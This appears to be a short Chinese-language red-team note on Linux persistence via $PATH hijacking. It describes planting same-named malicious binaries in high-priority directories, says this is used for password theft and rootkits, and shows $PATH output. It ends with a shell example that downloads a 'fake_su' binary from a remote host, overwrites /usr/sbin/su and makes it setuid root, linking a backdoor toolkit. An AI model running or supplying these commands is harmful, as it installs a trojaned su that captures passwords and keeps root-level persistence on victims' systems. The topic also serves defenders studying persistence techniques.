$PATH定义了命令加载时优先进行检索的目录，攻击者可以通过向$PATH内高优先级的目录下部署同名的恶意文件实现劫持低优先级目录命令的效果。

想要实现对$PATH的持久化篡改往往依赖于篡改登录执行文件（如/etc/profile）。

$PATH常被用于窃取密码，复制传染，部署应用层rootkit等功能。

```shell
root@walrus:~# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@walrus:~# su walrus
walrus@walrus:/root$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

例如：
```shell
#https://github.com/aplyc1a/toolkits/tree/master/0x04 持续控制/Linux/fake命令后门
wget http://10.1.1.1:12345/fake_su -O /usr/sbin/su
chown root:root /usr/sbin/su && chmod 4755 /usr/sbin/su
```

